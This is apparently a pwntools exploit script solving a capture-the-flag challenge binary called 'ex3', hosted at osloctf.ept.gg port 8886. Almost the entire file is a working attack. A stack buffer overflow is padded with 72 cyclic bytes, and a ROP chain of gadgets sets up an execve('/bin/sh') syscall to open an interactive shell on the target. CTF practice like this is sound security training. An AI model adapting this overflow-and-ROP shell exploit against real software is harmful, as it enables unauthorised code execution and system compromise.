#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./ex3')

host = args.HOST or 'osloctf.ept.gg'
port = int(args.PORT or 8886)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *main+84
continue
'''.format(**locals())

# -- Exploit goes here --
# 0x0000000000450f47: pop rax; ret;
# 0x0000000000401f0f: pop rdi; ret;
# 0x0000000000409f3e: pop rsi; ret;
# 0x0000000000485c8b: pop rdx; pop rbx; ret;
# 0x000000000041ab26: syscall; ret;
pop_rax_ret = 0x450f47
pop_rdi_ret = 0x401f0f
pop_rsi_ret = 0x409f3e
pop_rdx_pop_rbx_ret = 0x485c8b
binsh = 0x4C50F0
syscall_ret = 0x41ab26
io = start()
payload = cyclic(72)
payload += p64(pop_rax_ret) 
payload += p64(59) 
payload += p64(pop_rdi_ret)
payload += p64(binsh) 
payload += p64(pop_rsi_ret)
payload += p64(0)
payload += p64(pop_rdx_pop_rbx_ret)
payload += p64(0)
payload += p64(0)

payload += p64(syscall_ret)

io.sendline(payload)
io.interactive()

